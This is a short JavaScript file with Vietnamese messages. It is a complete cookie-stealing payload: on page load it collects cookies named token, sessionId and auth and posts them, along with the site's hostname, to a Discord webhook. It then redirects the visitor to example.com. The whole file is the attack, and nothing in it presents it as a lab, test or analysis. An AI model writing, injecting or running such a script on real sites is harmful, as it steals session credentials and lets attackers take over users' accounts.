// script.js
(function() {
  const webhookURL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";
  const wantedKeys = ["token", "sessionId", "auth"];

  const allCookies = document.cookie.split("; ").reduce((acc, pair) => {
    const [key, value] = pair.split("=");
    if (wantedKeys.includes(key)) {
      acc.push(`${key}=${value}`);
    }
    return acc;
  }, []);

  const message = allCookies.length > 0 
    ? allCookies.join("; ")
    : "Không tìm thấy cookie cần lọc.";

  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: "Cookie đã lọc từ " + window.location.hostname + ":\n```" + message + "```"
    })
  }).then(() => {
    window.location.href = "https://example.com"; // Trang bạn muốn chuyển đến
  }).catch((err) => {
    alert("Lỗi khi gửi: " + err);
  });
})();
